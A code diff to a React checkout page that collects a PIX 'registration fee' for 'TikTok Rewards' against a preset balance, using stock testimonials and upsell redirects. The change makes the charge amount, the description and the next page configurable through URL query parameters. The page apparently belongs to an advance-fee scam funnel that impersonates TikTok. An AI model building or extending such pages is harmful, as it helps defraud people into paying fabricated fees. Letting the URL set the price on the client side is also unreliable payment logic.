@@ -1,5 +1,5 @@
-import { useState, useEffect, useRef, useCallback } from "react";
-import { useNavigate } from "react-router-dom";
+import { useState, useEffect, useRef, useCallback, useMemo } from "react";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import { trackTikTokEvent } from "@/lib/tiktok-tracking";
 import { CheckCircle2, Star, Loader2, Copy, Check } from "lucide-react";
 import { QRCodeSVG } from "qrcode.react";
@@ -15,7 +15,7 @@ import testimonialMatheus from "@/assets/testimonial-matheus.png";
 import testimonialAna from "@/assets/testimonial-ana.png";
 import testimonialCarlos from "@/assets/testimonial-carlos.png";
 
-const TAX = 32.68;
+const DEFAULT_TAX = 32.68;
 const SALDO = TARGET_BALANCE;
 
 const testimonials = [
@@ -102,10 +102,19 @@ const PushNotification = ({
 
 const Pagamento = () => {
   const navigate = useNavigate();
+  const [searchParams] = useSearchParams();
+
+  const TAX = useMemo(() => {
+    const amt = parseFloat(searchParams.get("amount") || "");
+    return isNaN(amt) ? DEFAULT_TAX : amt;
+  }, [searchParams]);
+
+  const nextRoute = searchParams.get("next") || "/up1";
+  const paymentDesc = searchParams.get("desc") || "Taxa de Cadastro - TikTok Rewards";
 
   useEffect(() => {
     trackTikTokEvent({ event: "AddPaymentInfo", properties: { value: TAX, currency: "BRL" } });
-  }, []);
+  }, [TAX]);
 
   const [email, setEmail] = useState("");
   const [nomeCompleto, setNomeCompleto] = useState("");
@@ -147,12 +156,12 @@ const Pagamento = () => {
       const status = data?.status?.toLowerCase?.() || "";
       if (status === "approved") {
         if (pollingRef.current) clearInterval(pollingRef.current);
-        navigate("/up1");
+        navigate(nextRoute);
       }
     } catch {
       // silent retry
     }
-  }, [pixData?.transaction_id, navigate]);
+  }, [pixData?.transaction_id, navigate, nextRoute]);
 
   useEffect(() => {
     if (!pixData?.transaction_id) return;
@@ -179,7 +188,7 @@ const Pagamento = () => {
       const { data, error } = await supabase.functions.invoke("create-pix-payment", {
         body: {
           amount: Math.round(TAX * 100),
-          description: "Taxa de Cadastro - TikTok Rewards",
+          description: paymentDesc,
           reference,
           source: "api_externa",
           customer: {
